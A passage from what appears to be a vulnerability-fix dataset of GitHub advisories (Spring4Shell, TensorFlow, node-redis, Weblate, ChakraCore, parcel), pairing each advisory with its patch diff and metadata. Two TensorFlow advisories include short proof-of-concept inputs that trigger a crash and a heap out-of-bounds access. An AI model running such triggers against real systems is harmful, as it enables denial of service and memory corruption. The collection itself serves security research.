'deletions': 5, 'total': 5}","files":"{'enrocrypt\/hashing.py': {'additions': 0, 'deletions': 5, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Morgan-Phoenix\/EnroCrypt\/raw\/e652d56ac60eadfc26489ab83927af13a9b9d8ce\/enrocrypt%2Fhashing.py', 'patch': '@@ -66,11 +66,6 @@ def SHA244(self,data:str):\\n         hash = str(sha.digest())\\n         return self.__Salt(hash,salt=self.salt)\\n \\n-    def MD5(self,data:str):\\n-        sha = hashlib.md5(bytes(data.encode()))\\n-        hash = str(sha.digest())\\n-        return self.__Salt(hash,salt=self.salt)\\n-\\n     def SHA384(self,data:str):\\n         sha = hashlib.sha384(bytes(data.encode()))\\n         hash = str(sha.digest())'}}","message_norm":"fixed ghsa-35m5-8cvj-8783","language":"ca","entities":"[('fixed', 'ACTION', ''), ('ghsa-35m5-8cvj-8783', 'VULNID', 'GHSA')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['enrocrypt\/hashing.py'])","num_files":1.0},{"index":203,"vuln_id":"GHSA-35q2-47q7-3pc3","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/NodeRedis\/node-redis\/commit\/2d11b6dc9b9774464a91fb4b448bad8bf699629e'}","dataset":"osv","summary":"Node-Redis potential exponential regex in monitor mode ### Impact\nWhen a client is in monitoring mode, the regex begin used to detected monitor messages could cause exponential backtracking on some strings. This issue could lead to a denial of service.\n\n### Patches\nThe problem was fixed in commit [`2d11b6d`](https:\/\/github.com\/NodeRedis\/node-redis\/commit\/2d11b6dc9b9774464a91fb4b448bad8bf699629e) and was released in version `3.1.1`.\n\n### References\n#1569 (GHSL-2021-026)","published_date":"2021-04-27","chain_len":1,"project":"https:\/\/github.com\/NodeRedis\/node-redis","commit_href":"https:\/\/github.com\/NodeRedis\/node-redis\/commit\/2d11b6dc9b9774464a91fb4b448bad8bf699629e","commit_sha":"2d11b6dc9b9774464a91fb4b448bad8bf699629e","patch":"SINGLE","chain_ord":"['2d11b6dc9b9774464a91fb4b448bad8bf699629e']","before_first_fix_commit":"{'7e77de84bc80b0742321939c59612dc27559bbff'}","last_fix_commit":"2d11b6dc9b9774464a91fb4b448bad8bf699629e","chain_ord_pos":1.0,"commit_datetime":"04\/08\/2021, 22:04:34","message":"fix #1569 - improve monitor_regex (#1595)\n\nCo-authored-by: Guy Korland <gkorland@gmail.com>","author":"Leibale Eidelman","comments":"{'com_1': {'author': 'Plavit', 'datetime': '04\/27\/2021, 21:27:30', 'body': 'lemme check compatibility'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/utils.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/redis\/node-redis\/raw\/2d11b6dc9b9774464a91fb4b448bad8bf699629e\/lib%2Futils.js', 'patch': '@@ -127,7 +127,7 @@ module.exports = {\\n     reply_to_object: replyToObject,\\n     print: print,\\n     err_code: \/^([A-Z]+)\\\\s+(.+)$\/,\\n-    monitor_regex: \/^[0-9]{10,11}\\\\.[0-9]+ \\\\[[0-9]+ .+\\\\]( \".+?\")+$\/,\\n+    monitor_regex: \/^[0-9]{10,11}\\\\.[0-9]+ \\\\[[0-9]+ .+\\\\].*\"$\/,\\n     clone: convenienceClone,\\n     callback_or_emit: callbackOrEmit,\\n     reply_in_order: replyInOrder'}}","message_norm":"fix #1569 - improve monitor_regex (#1595)\n\nco-authored-by: guy korland <gkorland@gmail.com>","language":"en","entities":"[('fix', 'ACTION', ''), ('#1569', 'ISSUE', ''), ('improve', 'ACTION', ''), ('#1595', 'ISSUE', ''), ('gkorland@gmail.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/utils.js'])","num_files":1.0},{"index":205,"vuln_id":"GHSA-36p3-wjmg-h94x","cwe_id":"{'CWE-74', 'CWE-94'}","score":9.8,"chain":"{'https:\/\/github.com\/spring-projects\/spring-framework\/commit\/002546b3e4b8d791ea6acccb81eb3168f51abb15'}","dataset":"osv","summary":"Remote Code Execution in Spring Framework Spring Framework prior to versions 5.2.20 and 5.3.18 contains a remote code execution vulnerability known as `Spring4Shell`. \n\n## Impact\n\nA Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.\n\nThese are the prerequisites for the exploit:\n- JDK 9 or higher\n- Apache Tomcat as the Servlet container\n- Packaged as WAR\n- `spring-webmvc` or `spring-webflux` dependency\n\n## Patches\n\n- Spring Framework [5.3.18](https:\/\/github.com\/spring-projects\/spring-framework\/releases\/tag\/v5.3.18) and [5.2.20](https:\/\/github.com\/spring-projects\/spring-framework\/releases\/tag\/v5.2.20.RELEASE)\n- Spring Boot [2.6.6](https:\/\/github.com\/spring-projects\/spring-boot\/releases\/tag\/v2.6.6) and [2.5.12](https:\/\/github.com\/spring-projects\/spring-boot\/releases\/tag\/v2.5.12)\n\n## Workarounds\n\nFor those who are unable to upgrade, leaked reports recommend setting `disallowedFields` on `WebDataBinder` through an `@ControllerAdvice`. This works generally, but as a centrally applied workaround fix, may leave some loopholes, in particular if a controller sets `disallowedFields` locally through its own `@InitBinder` method, which overrides the global setting.\n\nTo apply the workaround in a more fail-safe way, applications could extend `RequestMappingHandlerAdapter` to update the `WebDataBinder` at the end after all other initialization. In order to do that, a Spring Boot application can declare a `WebMvcRegistrations` bean (Spring MVC) or a `WebFluxRegistrations` bean (Spring WebFlux).","published_date":"2022-03-31","chain_len":1,"project":"https:\/\/github.com\/spring-projects\/spring-framework","commit_href":"https:\/\/github.com\/spring-projects\/spring-framework\/commit\/002546b3e4b8d791ea6acccb81eb3168f51abb15","commit_sha":"002546b3e4b8d791ea6acccb81eb3168f51abb15","patch":"SINGLE","chain_ord":"['002546b3e4b8d791ea6acccb81eb3168f51abb15']","before_first_fix_commit":"{'1627f57f1f77abe17dd607c75476b9e4cb22ffbb'}","last_fix_commit":"002546b3e4b8d791ea6acccb81eb3168f51abb15","chain_ord_pos":1.0,"commit_datetime":"03\/31\/2022, 07:34:51","message":"Refine PropertyDescriptor filtering\n\nRestrict property paths under `Class` and properties of types\n`ClassLoader` or `ProtectionDomain`.","author":"Brian Clozel","comments":null,"stats":"{'additions': 14, 'deletions': 4, 'total': 18}","files":"{'spring-beans\/src\/main\/java\/org\/springframework\/beans\/CachedIntrospectionResults.java': {'additions': 14, 'deletions': 4, 'changes': 18, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/spring-projects\/spring-framework\/raw\/002546b3e4b8d791ea6acccb81eb3168f51abb15\/spring-beans%2Fsrc%2Fmain%2Fjava%2Forg%2Fspringframework%2Fbeans%2FCachedIntrospectionResults.java', 'patch': '@@ -1,5 +1,5 @@\\n \/*\\n- * Copyright 2002-2020 the original author or authors.\\n+ * Copyright 2002-2022 the original author or authors.\\n  *\\n  * Licensed under the Apache License, Version 2.0 (the \"License\");\\n  * you may not use this file except in compliance with the License.\\n@@ -22,6 +22,7 @@\\n import java.beans.PropertyDescriptor;\\n import java.lang.reflect.Method;\\n import java.lang.reflect.Modifier;\\n+import java.security.ProtectionDomain;\\n import java.util.Collections;\\n import java.util.HashSet;\\n import java.util.LinkedHashMap;\\n@@ -286,9 +287,13 @@ private CachedIntrospectionResults(Class<?> beanClass) throws BeansException {\\n \\t\\t\\t\/\/ This call is slow so we do it once.\\n \\t\\t\\tPropertyDescriptor[] pds = this.beanInfo.getPropertyDescriptors();\\n \\t\\t\\tfor (PropertyDescriptor pd : pds) {\\n-\\t\\t\\t\\tif (Class.class == beanClass &&\\n-\\t\\t\\t\\t\\t\\t(\"classLoader\".equals(pd.getName()) ||  \"protectionDomain\".equals(pd.getName()))) {\\n-\\t\\t\\t\\t\\t\/\/ Ignore Class.getClassLoader() and getProtectionDomain() methods - nobody needs to bind to those\\n+\\t\\t\\t\\tif (Class.class == beanClass && (!\"name\".equals(pd.getName()) && !pd.getName().endsWith(\"Name\"))) {\\n+\\t\\t\\t\\t\\t\/\/ Only allow all name variants of Class properties\\n+\\t\\t\\t\\t\\tcontinue;\\n+\\t\\t\\t\\t}\\n+\\t\\t\\t\\tif (pd.getPropertyType() != null && (ClassLoader.class.isAssignableFrom(pd.getPropertyType())\\n+\\t\\t\\t\\t\\t\\t|| ProtectionDomain.class.isAssignableFrom(pd.getPropertyType()))) {\\n+\\t\\t\\t\\t\\t\/\/ Ignore ClassLoader and ProtectionDomain types - nobody needs to bind to those\\n \\t\\t\\t\\t\\tcontinue;\\n \\t\\t\\t\\t}\\n \\t\\t\\t\\tif (logger.isTraceEnabled()) {\\n@@ -337,6 +342,11 @@ private void introspectInterfaces(Class<?> beanClass, Class<?> currClass, Set<St\\n \\t\\t\\t\\t\\t\\t\/\/ GenericTypeAwarePropertyDescriptor leniently resolves a set* write method\\n \\t\\t\\t\\t\\t\\t\/\/ against a declared read method, so we prefer read method descriptors here.\\n \\t\\t\\t\\t\\t\\tpd = buildGenericTypeAwarePropertyDescriptor(beanClass, pd);\\n+\\t\\t\\t\\t\\t\\tif (pd.getPropertyType() != null && (ClassLoader.class.isAssignableFrom(pd.getPropertyType())\\n+\\t\\t\\t\\t\\t\\t\\t\\t|| ProtectionDomain.class.isAssignableFrom(pd.getPropertyType()))) {\\n+\\t\\t\\t\\t\\t\\t\\t\/\/ Ignore ClassLoader and ProtectionDomain types - nobody needs to bind to those\\n+\\t\\t\\t\\t\\t\\t\\tcontinue;\\n+\\t\\t\\t\\t\\t\\t}\\n \\t\\t\\t\\t\\t\\tthis.propertyDescriptors.put(pd.getName(), pd);\\n \\t\\t\\t\\t\\t\\tMethod readMethod = pd.getReadMethod();\\n \\t\\t\\t\\t\\t\\tif (readMethod != null) {'}}","message_norm":"refine propertydescriptor filtering\n\nrestrict property paths under `class` and properties of types\n`classloader` or `protectiondomain`.","language":"en","entities":"[('protectiondomain', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['spring-beans\/src\/main\/java\/org\/springframework\/beans\/CachedIntrospectionResults.java'])","num_files":1.0},{"index":206,"vuln_id":"GHSA-36vm-xw34-x4pj","cwe_id":"{'CWE-617'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1c56f53be0b722ca657cbc7df461ed676c8642a2'}","dataset":"osv","summary":"CHECK-fail in `tf.raw_ops.IRFFT` ### Impact\nAn attacker can cause a denial of service by exploiting a `CHECK`-failure coming from the implementation of `tf.raw_ops.IRFFT`:\n    \n```python\nimport tensorflow as tf\n\nvalues = [-10.0] * 130\nvalues[0] = -9.999999999999995\ninputs = tf.constant(values, shape=[10, 13], dtype=tf.float32)\ninputs = tf.cast(inputs, dtype=tf.complex64)\nfft_length = tf.constant([0], shape=[1], dtype=tf.int32)\n\ntf.raw_ops.IRFFT(input=inputs, fft_length=fft_length)\n``` \n    \nThe above example causes Eigen code to operate on an empty matrix. This triggers on an assertion and causes program termination.\n\n### Patches\nWe have patched the issue in GitHub commit [1c56f53be0b722ca657cbc7df461ed676c8642a2](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1c56f53be0b722ca657cbc7df461ed676c8642a2).\n  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1c56f53be0b722ca657cbc7df461ed676c8642a2","commit_sha":"1c56f53be0b722ca657cbc7df461ed676c8642a2","patch":"SINGLE","chain_ord":"['1c56f53be0b722ca657cbc7df461ed676c8642a2']","before_first_fix_commit":"{'8926cbdbbff8b9975d63a41569d51c50a9806d9d'}","last_fix_commit":"1c56f53be0b722ca657cbc7df461ed676c8642a2","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 00:11:46","message":"Fix a check fail in Fast Fourier implementation\n\nPiperOrigin-RevId: 372026629\nChange-Id: Id05c3362aa575271bc3e06b16316c9037085fc11","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/kernels\/fft_ops.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/1c56f53be0b722ca657cbc7df461ed676c8642a2\/tensorflow%2Fcore%2Fkernels%2Ffft_ops.cc', 'patch': '@@ -13,6 +13,7 @@ See the License for the specific language governing permissions and\\n limitations under the License.\\n ==============================================================================*\/\\n \\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n #define EIGEN_USE_THREADS\\n \\n \/\/ See docs in ..\/ops\/fft_ops.cc.\\n@@ -261,6 +262,9 @@ class FFTCPU : public FFTBase {\\n           i == FFTRank ? fft_shape[i - 1] \/ 2 + 1 : fft_shape[i - 1];\\n       full_fft_shape.AddDim(fft_shape[i - 1]);\\n     }\\n+    OP_REQUIRES(ctx, full_fft_shape.num_elements() > 0,\\n+                errors::InvalidArgument(\"Obtained a FFT shape of 0 elements: \",\\n+                                        full_fft_shape.DebugString()));\\n \\n     Tensor temp;\\n     OP_REQUIRES_OK(ctx, ctx->allocate_temp(DataTypeToEnum<ComplexT>::v(),'}}","message_norm":"fix a check fail in fast fourier implementation\n\npiperorigin-revid: 372026629\nchange-id: id05c3362aa575271bc3e06b16316c9037085fc11","language":"en","entities":"[('fix', 'ACTION', ''), ('372026629', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/fft_ops.cc'])","num_files":1.0},{"index":208,"vuln_id":"GHSA-374m-jm66-3vj8","cwe_id":"{'CWE-125'}","score":7.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f410212e373eb2aec4c9e60bf3702eba99a38aba'}","dataset":"osv","summary":"Heap OOB in `SparseBinCount` ### Impact\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/e71b86d47f8bc1816bf54d7bddc4170e47670b97\/tensorflow\/core\/kernels\/bincount_op.cc#L353-L417) of `SparseBinCount` is vulnerable to a heap OOB:\n\n```python\nimport tensorflow as tf\n  \n  \ntf.raw_ops.SparseBincount(\n  indices=[[0],[1],[2]]\n  values=[0,-10000000]\n  dense_shape=[1,1]\n  size=[1]\n  weights=[3,2,1]\n  binary_output=False)\n```\n\nThis is because of missing validation between the elements of the `values` argument and the shape of the sparse output:\n\n\n```cc\nfor (int64_t i = 0; i < indices_mat.dimension(0); ++i) {\n  const int64_t batch = indices_mat(i, 0);\n  const Tidx bin = values(i);\n  ...\n  out(batch, bin) = ...;\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f410212e373eb2aec4c9e60bf3702eba99a38aba](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f410212e373eb2aec4c9e60bf3702eba99a38aba).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-11-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f410212e373eb2aec4c9e60bf3702eba99a38aba","commit_sha":"f410212e373eb2aec4c9e60bf3702eba99a38aba","patch":"SINGLE","chain_ord":"['f410212e373eb2aec4c9e60bf3702eba99a38aba']","before_first_fix_commit":"{'4656caa7d74420454da967288af143ec73fb4c9b'}","last_fix_commit":"f410212e373eb2aec4c9e60bf3702eba99a38aba","chain_ord_pos":1.0,"commit_datetime":"09\/30\/2021, 13:36:55","message":"Prevent out-of-bound accesses in SparseBincount.\n\nPiperOrigin-RevId: 399918616\nChange-Id: I11d154f4444d3fde1f09c5c40628b8671791a30d","author":"Penporn Koanantakool","comments":null,"stats":"{'additions': 10, 'deletions': 0, 'total': 10}","files":"{'tensorflow\/core\/kernels\/bincount_op.cc': {'additions': 10, 'deletions': 0, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/f410212e373eb2aec4c9e60bf3702eba99a38aba\/tensorflow%2Fcore%2Fkernels%2Fbincount_op.cc', 'patch': '@@ -405,6 +405,16 @@ class SparseBincountOp : public OpKernel {\\n       for (int64_t i = 0; i < indices_mat.dimension(0); ++i) {\\n         const int64_t batch = indices_mat(i, 0);\\n         const Tidx bin = values(i);\\n+        OP_REQUIRES(\\n+            ctx, batch < out.dimension(0),\\n+            errors::InvalidArgument(\"Index out of bound. `batch` (\", batch,\\n+                                    \") must be less than the dimension size (\",\\n+                                    out.dimension(0), \").\"));\\n+        OP_REQUIRES(\\n+            ctx, bin < out.dimension(1),\\n+            errors::InvalidArgument(\"Index out ouf bound. `bin` (\", bin,\\n+                                    \") must be less then the dimension size (\",\\n+                                    out.dimension(1), \").\"));\\n         if (bin < size) {\\n           if (binary_output_) {\\n             out(batch, bin) = T(1);'}}","message_norm":"prevent out-of-bound accesses in sparsebincount.\n\npiperorigin-revid: 399918616\nchange-id: i11d154f4444d3fde1f09c5c40628b8671791a30d","language":"en","entities":"[('prevent', 'ACTION', ''), ('out-of-bound', 'SECWORD', ''), ('399918616', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/bincount_op.cc'])","num_files":1.0},{"index":215,"vuln_id":"GHSA-37pf-w9ff-gqvm","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/d797e3f00e34c12c8c0ae52f56344325439dccd7', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/87ac2b5a751710ee288fdda3fd4d9818e22387a1'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0912, CVE-2019-0913, CVE-2019-0914, CVE-2019-0915, CVE-2019-0916, CVE-2019-0917, CVE-2019-0922, CVE-2019-0923, CVE-2019-0924, CVE-2019-0925, CVE-2019-0933, CVE-2019-0937.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/87ac2b5a751710ee288fdda3fd4d9818e22387a1","commit_sha":"87ac2b5a751710ee288fdda3fd4d9818e22387a1","patch":"MULTI","chain_ord":"['87ac2b5a751710ee288fdda3fd4d9818e22387a1', 'd797e3f00e34c12c8c0ae52f56344325439dccd7']","before_first_fix_commit":"{'ea0491305137183603bf43844b5584d4cc972e28', '4594e340bc9ca9f857010a68e8b562d65b46eed6'}","last_fix_commit":"d797e3f00e34c12c8c0ae52f56344325439dccd7","chain_ord_pos":1.0,"commit_datetime":"04\/17\/2019, 17:22:17","message":"[CVE-2019-0927]","author":"Michael Holman","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'lib\/Backend\/GlobOptFields.cpp': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/87ac2b5a751710ee288fdda3fd4d9818e22387a1\/lib%2FBackend%2FGlobOptFields.cpp', 'patch': '@@ -394,6 +394,7 @@ GlobOpt::ProcessFieldKills(IR::Instr *instr, BVSparse<JitArenaAllocator> *bv, bo\\n     case Js::OpCode::StRootFldStrict:\\n     case Js::OpCode::StSlot:\\n     case Js::OpCode::StSlotChkUndecl:\\n+    case Js::OpCode::StSuperFld:\\n         Assert(dstOpnd != nullptr);\\n         sym = dstOpnd->AsSymOpnd()->m_sym;\\n         if (inGlobOpt)'}}","message_norm":"[cve-2019-0927]","language":"ro","entities":"[('cve-2019-0927', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Backend\/GlobOptFields.cpp'])","num_files":1.0},{"index":216,"vuln_id":"GHSA-37q6-576q-vgr7","cwe_id":"{'CWE-200'}","score":7.5,"chain":"{'https:\/\/github.com\/parcel-bundler\/parcel\/commit\/066e0bf6bd26b15c78bd47df023452e4b20073e4'}","dataset":"osv","summary":"Missing Origin Validation in parcel-bundler Versions of `parcel-bundler` before 1.10.0 are missing origin validation on the websocket server. This vulnerability allows a remote attacker to steal a developer's source code because the origin of requests to the websocket server that is used for Hot Module Replacement (HMR) are not validated.\n\n\n## Recommendation\n\nUpdate to version 1.10.0 or later.","published_date":"2018-10-30","chain_len":1,"project":"https:\/\/github.com\/parcel-bundler\/parcel","commit_href":"https:\/\/github.com\/parcel-bundler\/parcel\/commit\/066e0bf6bd26b15c78bd47df023452e4b20073e4","commit_sha":"066e0bf6bd26b15c78bd47df023452e4b20073e4","patch":"SINGLE","chain_ord":"['066e0bf6bd26b15c78bd47df023452e4b20073e4']","before_first_fix_commit":"{'948159b99adbc74857b380576e1e104a9097f259'}","last_fix_commit":"066e0bf6bd26b15c78bd47df023452e4b20073e4","chain_ord_pos":1.0,"commit_datetime":"09\/25\/2018, 03:49:56","message":"fix security vuln (#1794)","author":"Jasper De Moor","comments":null,"stats":"{'additions': 11, 'deletions': 1, 'total': 12}","files":"{'packages\/core\/parcel-bundler\/src\/HMRServer.js': {'additions': 11, 'deletions': 1, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/parcel-bundler\/parcel\/raw\/066e0bf6bd26b15c78bd47df023452e4b20073e4\/packages%2Fcore%2Fparcel-bundler%2Fsrc%2FHMRServer.js', 'patch': \"@@ -17,7 +17,17 @@ class HMRServer {\\n         this.server = https.createServer(await getCertificate(options.https));\\n       }\\n \\n-      this.wss = new WebSocket.Server({server: this.server});\\n+      let websocketOptions = {\\n+        server: this.server\\n+      };\\n+\\n+      if (options.hmrHostname) {\\n+        websocketOptions.origin = `${options.https ? 'https' : 'http'}:\/\/${\\n+          options.hmrHostname\\n+        }`;\\n+      }\\n+\\n+      this.wss = new WebSocket.Server(websocketOptions);\\n       this.server.listen(options.hmrPort, resolve);\\n     });\"}}","message_norm":"fix security vuln (#1794)","language":"ro","entities":"[('fix', 'ACTION', ''), ('security', 'SECWORD', ''), ('#1794', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['packages\/core\/parcel-bundler\/src\/HMRServer.js'])","num_files":1.0},{"index":218,"vuln_id":"GHSA-3872-f48p-pxqj","cwe_id":"{'CWE-88', 'CWE-77'}","score":8.8,"chain":"{'https:\/\/github.com\/WeblateOrg\/weblate\/commit\/d83672a3e7415da1490334e2c9431e5da1966842', 'https:\/\/github.com\/WeblateOrg\/weblate\/commit\/35d59f1f040541c358cece0a8d4a63183ca919b8'}","dataset":"osv","summary":"Improper Neutralization of Special Elements used in a Command ('Command Injection') in Weblate ### Impact\nWeblate didn't correctly sanitize some arguments passed to Git and Mercurial, which allowed changing their behavior in an unintended way.\n\n### Patches\n\nThe issues were fixed in the 4.11.1 release. The following commits are addressing it:\n\n* 35d59f1f040541c358cece0a8d4a63183ca919b8\n* d83672a3e7415da1490334e2c9431e5da1966842\n\n### Workarounds\n\nInstances in which untrusted users cannot create new components are not affected.\n\n### References\n* [SNYK-PYTHON-WEBLATE-2414088](https:\/\/security.snyk.io\/vuln\/SNYK-PYTHON-WEBLATE-2414088)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a topic in [discussions](https:\/\/github.com\/WeblateOrg\/weblate\/discussions)\n* Email us at [care@weblate.org](mailto:care@weblate.org)","published_date":"2022-03-04","chain_len":2,"project":"https:\/\/github.com\/WeblateOrg\/weblate","commit_href":"https:\/\/github.com\/WeblateOrg\/weblate\/commit\/d83672a3e7415da1490334e2c9431e5da1966842","commit_sha":"d83672a3e7415da1490334e2c9431e5da1966842","patch":"MULTI","chain_ord":"['35d59f1f040541c358cece0a8d4a63183ca919b8', 'd83672a3e7415da1490334e2c9431e5da1966842']","before_first_fix_commit":"{'9a5a09781e5a19ab9a24878afb08c9fcafb21ca7'}","last_fix_commit":"d83672a3e7415da1490334e2c9431e5da1966842","chain_ord_pos":2.0,"commit_datetime":"03\/03\/2022, 07:45:16","message":"vcs: Improve git parameters handling\n\nMake sure that all user provided input is handled as expected.","author":"Michal \u010ciha\u0159","comments":null,"stats":"{'additions': 5, 'deletions': 3, 'total': 8}","files":"{'weblate\/vcs\/git.py': {'additions': 5, 'deletions': 3, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/WeblateOrg\/weblate\/raw\/d83672a3e7415da1490334e2c9431e5da1966842\/weblate%2Fvcs%2Fgit.py', 'patch': '@@ -85,7 +85,7 @@ def get_remote_branch(cls, repo: str):\\n         if not repo:\\n             return super().get_remote_branch(repo)\\n         try:\\n-            result = cls._popen([\"ls-remote\", \"--symref\", repo, \"HEAD\"])\\n+            result = cls._popen([\"ls-remote\", \"--symref\", \"--\", repo, \"HEAD\"])\\n         except RepositoryException:\\n             report_error(cause=\"Listing remote branch\")\\n             return super().get_remote_branch(repo)\\n@@ -149,7 +149,9 @@ def get_depth():\\n     @classmethod\\n     def _clone(cls, source: str, target: str, branch: str):\\n         \"\"\"Clone repository.\"\"\"\\n-        cls._popen([\"clone\"] + cls.get_depth() + [\"--branch\", branch, source, target])\\n+        cls._popen(\\n+            [\"clone\"] + cls.get_depth() + [\"--branch\", branch, \"--\", source, target]\\n+        )\\n \\n     def get_config(self, path):\\n         \"\"\"Read entry from configuration.\"\"\"\\n@@ -572,7 +574,7 @@ def get_last_repo_revision(cls, url):\\n \\n     @classmethod\\n     def get_remote_args(cls, source, target):\\n-        result = [\"--prefix=origin\/\", source, target]\\n+        result = [\"--prefix=origin\/\", \"--\", source, target]\\n         if cls.is_stdlayout(source):\\n             result.insert(0, \"--stdlayout\")\\n             revision = cls.get_last_repo_revision(source + \"\/trunk\/\")'}}","message_norm":"vcs: improve git parameters handling\n\nmake sure that all user provided input is handled as expected.","language":"en","entities":"[('improve', 'ACTION', ''), ('user provided input', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['weblate\/vcs\/git.py'])","num_files":1.0},{"index":219,"vuln_id":"GHSA-3872-f48p-pxqj","cwe_id":"{'CWE-88', 'CWE-77'}","score":8.8,"chain":"{'https:\/\/github.com\/WeblateOrg\/weblate\/commit\/d83672a3e7415da1490334e2c9431e5da1966842', 'https:\/\/github.com\/WeblateOrg\/weblate\/commit\/35d59f1f040541c358cece0a8d4a63183ca919b8'}","dataset":"osv","summary":"Improper Neutralization of Special Elements used in a Command ('Command Injection') in Weblate ### Impact\nWeblate didn't correctly sanitize some arguments passed to Git and Mercurial, which allowed changing their behavior in an unintended way.\n\n### Patches\n\nThe issues were fixed in the 4.11.1 release. The following commits are addressing it:\n\n* 35d59f1f040541c358cece0a8d4a63183ca919b8\n* d83672a3e7415da1490334e2c9431e5da1966842\n\n### Workarounds\n\nInstances in which untrusted users cannot create new components are not affected.\n\n### References\n* [SNYK-PYTHON-WEBLATE-2414088](https:\/\/security.snyk.io\/vuln\/SNYK-PYTHON-WEBLATE-2414088)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a topic in [discussions](https:\/\/github.com\/WeblateOrg\/weblate\/discussions)\n* Email us at [care@weblate.org](mailto:care@weblate.org)","published_date":"2022-03-04","chain_len":2,"project":"https:\/\/github.com\/WeblateOrg\/weblate","commit_href":"https:\/\/github.com\/WeblateOrg\/weblate\/commit\/35d59f1f040541c358cece0a8d4a63183ca919b8","commit_sha":"35d59f1f040541c358cece0a8d4a63183ca919b8","patch":"MULTI","chain_ord":"['35d59f1f040541c358cece0a8d4a63183ca919b8', 'd83672a3e7415da1490334e2c9431e5da1966842']","before_first_fix_commit":"{'9a5a09781e5a19ab9a24878afb08c9fcafb21ca7'}","last_fix_commit":"d83672a3e7415da1490334e2c9431e5da1966842","chain_ord_pos":1.0,"commit_datetime":"03\/03\/2022, 07:25:01","message":"vcs: Improve mercurial parameters handling\n\nMake sure that all user provided input is handled as expected.","author":"Michal \u010ciha\u0159","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'weblate\/vcs\/mercurial.py': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/WeblateOrg\/weblate\/raw\/35d59f1f040541c358cece0a8d4a63183ca919b8\/weblate%2Fvcs%2Fmercurial.py', 'patch': '@@ -70,7 +70,7 @@ def check_config(self):\\n     @classmethod\\n     def _clone(cls, source: str, target: str, branch: str):\\n         \"\"\"Clone repository.\"\"\"\\n-        cls._popen([\"clone\", \"--branch\", branch, source, target])\\n+        cls._popen([\"clone\", f\"--branch={branch}\", \"--\", source, target])\\n \\n     def get_config(self, path):\\n         \"\"\"Read entry from configuration.\"\"\"\\n@@ -323,7 